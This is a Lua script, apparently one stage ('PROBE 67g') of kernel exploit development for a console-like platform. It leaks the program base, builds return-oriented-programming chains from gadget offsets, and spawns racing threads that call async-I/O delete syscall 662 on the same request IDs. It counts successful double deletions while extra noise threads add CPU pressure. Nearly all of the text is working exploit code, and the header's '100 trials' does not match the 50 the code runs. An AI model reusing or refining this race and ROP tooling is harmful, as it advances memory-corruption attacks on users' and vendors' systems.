-- CRASH_CLASS: MODERATE
-- PROBE 67g: High-throughput 662 race with CPU pressure
--
-- Fresh process STILL serializes. The original 65l success at 83% rate
-- cannot randomly drop to 0% — something about conditions changed.
-- Hypothesis: the original run had CPU contention from concurrent activity.
--
-- This probe:
-- 1. Pre-allocates all buffers (zero per-trial alloc overhead)
-- 2. Runs 100 trials of the two-child race
-- 3. Optionally spawns "noise" threads doing getpid chains for CPU pressure
-- 4. Tests with BATCH=16 (matching original 65l)

print("=== PROBE 67g: high-throughput 662 race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print(string.format("eb=0x%X%08X", ehi, elo))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- Pre-allocate ALL buffers
local BATCH = 16
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
local del_ids  = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
-- Pre-alloc 2 stacks (reused across trials)
local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)
-- Pre-alloc 2 thr_param (reused)
local par_A = memory.alloc(0x40)
local par_B = memory.alloc(0x40)
local tid_A = memory.alloc(8)
local tid_B = memory.alloc(8)
-- Pre-alloc noise stacks (4 threads)
local noise_stk = {}
local noise_par = {}
local noise_tid = {}
local noise_mkr = {}
for i = 1, 4 do
    noise_stk[i] = memory.alloc(0x4000)
    noise_par[i] = memory.alloc(0x40)
    noise_tid[i] = memory.alloc(8)
    noise_mkr[i] = memory.alloc(8)
end

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

-- =========================================================
-- [A] Spawn 4 noise threads doing getpid×200 each
-- These create CPU contention to force scheduler preemption
-- =========================================================
print("")
print("[A] Spawning noise threads")

for ni = 1, 4 do
    local sb = N(noise_stk[ni])
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    -- Start marker
    em(g_pop_rax); em(uint64(0xEE))
    em(g_pop_rdi); em(uint64(N(noise_mkr[ni])))
    em(g_mov_m_rax)
    -- getpid x 200 (burns CPU)
    for j = 1, 200 do
        em(g_pop_rax); em(uint64(20))
        em(stub)
    end
    -- Done marker
    em(g_pop_rax); em(uint64(0xFF))
    em(g_pop_rdi); em(uint64(N(noise_mkr[ni])))
    em(g_mov_m_rax)
    -- Exit
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    wq(N(noise_mkr[ni]), uint64(0))
    for i = 0, 0x3C, 4 do wd(N(noise_par[ni]) + i, 0) end
    wq(N(noise_par[ni]), g_bare_ret)
    wq(N(noise_par[ni]) + 0x10, uint64(sb))
    wq(N(noise_par[ni]) + 0x18, uint64(0x2000))
    wq(N(noise_tid[ni]), uint64(0))
    wq(N(noise_par[ni]) + 0x30, noise_tid[ni])
    pcall(function() mk(455)(noise_par[ni], uint64(0x38)) end)
end

-- Brief wait for noise to start
for w = 1, 5000 do local _ = rd(N(dbuf)) end
local noise_started = 0
for ni = 1, 4 do
    local m = rd(N(noise_mkr[ni])) or 0
    if m > 0 then noise_started = noise_started + 1 end
end
print(string.format("  %d/4 noise threads started", noise_started))

-- =========================================================
-- [B] Race trials WHILE noise is running
-- =========================================================
print("")
print("[B] Race (with noise)")

local total_doubles = 0
local TRIALS = 50

for trial = 1, TRIALS do
    if not alive() then
        print(string.format("  trial %d: DEAD", trial))
        break
    end

    -- Submit + poll BATCH victims
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_664(id); table.insert(ids, id) end
    end
    if #ids < 4 then
        print(string.format("  trial %d: only %d IDs, stopping", trial, #ids))
        break
    end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Build child A ROP: 662 → marker → exit
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rax); emA(uint64(0xA1))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Build child B ROP: 662 → marker → exit
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rax); emB(uint64(0xB1))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- Set up thr_params (reuse pre-allocated)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    wq(N(tid_A), uint64(0))
    wq(N(par_A) + 0x30, tid_A)

    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    wq(N(tid_B), uint64(0))
    wq(N(par_B) + 0x30, tid_B)

    -- Spawn both back-to-back (no sleep)
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for completion
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local mA = rd(N(marker_A)) or 0
    local mB = rd(N(marker_B)) or 0
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  trial %2d: *** %d DOUBLES *** A=%d B=%d mA=0x%X mB=0x%X",
            trial, doubles, a_ok, b_ok, mA, mB))
    elseif trial <= 5 or trial % 10 == 0 or trial == TRIALS then
        print(string.format("  trial %2d: dbl=0 A=%d B=%d mA=0x%X mB=0x%X",
            trial, a_ok, b_ok, mA, mB))
    end

    if not alive() then break end
end

-- Wait for noise threads to finish
for w = 1, 100000 do local _ = rd(N(dbuf)) end
local noise_done = 0
for ni = 1, 4 do
    local m = rd(N(noise_mkr[ni])) or 0
    if m == 0xFF then noise_done = noise_done + 1 end
end

-- =========================================================
-- [C] If no doubles with noise, try without noise (baseline)
-- =========================================================
if alive() and total_doubles == 0 then
    print("")
    print(string.format("[C] Noise threads: %d/4 finished", noise_done))
    print("[C] Baseline (no noise, 30 trials)")

    for trial = 1, 30 do
        if not alive() then break end

        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(ids, id) end
        end
        if #ids < 4 then break end
        local count = #ids

        for i = 0, count - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end
        wq(N(marker_A), uint64(0))
        wq(N(marker_B), uint64(0))

        local sb_A = N(stk_A)
        local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
        local oA = 0
        local function eA(v) wq(rsp_A + oA, v); oA = oA + 8 end
        eA(g_pop_rdi); eA(uint64(N(del_ids)))
        eA(g_pop_rsi); eA(uint64(count))
        eA(g_pop_rdx); eA(uint64(N(states_A)))
        eA(g_pop_rax); eA(uint64(662))
        eA(stub)
        eA(g_pop_rax); eA(uint64(0xA1))
        eA(g_pop_rdi); eA(uint64(N(marker_A)))
        eA(g_mov_m_rax)
        eA(g_pop_rdi); eA(uint64(0))
        eA(g_pop_rax); eA(uint64(431))
        eA(stub)

        local sb_B = N(stk_B)
        local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
        local oB = 0
        local function eB(v) wq(rsp_B + oB, v); oB = oB + 8 end
        eB(g_pop_rdi); eB(uint64(N(del_ids)))
        eB(g_pop_rsi); eB(uint64(count))
        eB(g_pop_rdx); eB(uint64(N(states_B)))
        eB(g_pop_rax); eB(uint64(662))
        eB(stub)
        eB(g_pop_rax); eB(uint64(0xB1))
        eB(g_pop_rdi); eB(uint64(N(marker_B)))
        eB(g_mov_m_rax)
        eB(g_pop_rdi); eB(uint64(0))
        eB(g_pop_rax); eB(uint64(431))
        eB(stub)

        for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
        wq(N(par_A), g_bare_ret)
        wq(N(par_A) + 0x10, uint64(sb_A))
        wq(N(par_A) + 0x18, uint64(0x2000))
        wq(N(tid_A), uint64(0))
        wq(N(par_A) + 0x30, tid_A)

        for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
        wq(N(par_B), g_bare_ret)
        wq(N(par_B) + 0x10, uint64(sb_B))
        wq(N(par_B) + 0x18, uint64(0x2000))
        wq(N(tid_B), uint64(0))
        wq(N(par_B) + 0x30, tid_B)

        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)

        for w = 1, 50000 do local _ = rd(N(dbuf)) end

        local mA = rd(N(marker_A)) or 0
        local mB = rd(N(marker_B)) or 0
        local a_ok, b_ok, doubles = 0, 0, 0
        for i = 0, count - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 then a_ok = a_ok + 1 end
            if sB == 0 then b_ok = b_ok + 1 end
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles

        if doubles > 0 then
            print(string.format("  trial %2d: *** %d DOUBLES *** A=%d B=%d",
                trial, doubles, a_ok, b_ok))
        elseif trial <= 3 or trial == 30 then
            print(string.format("  trial %2d: dbl=0 A=%d B=%d mA=0x%X mB=0x%X",
                trial, a_ok, b_ok, mA, mB))
        end

        if not alive() then break end
    end
end

print("")
print("[SUMMARY]")
print(string.format("  total_doubles=%d alive=%s pid=%d",
    total_doubles, alive() and "YES" or "NO", pid_val))
print("")
print("=== PROBE 67g COMPLETE ===")
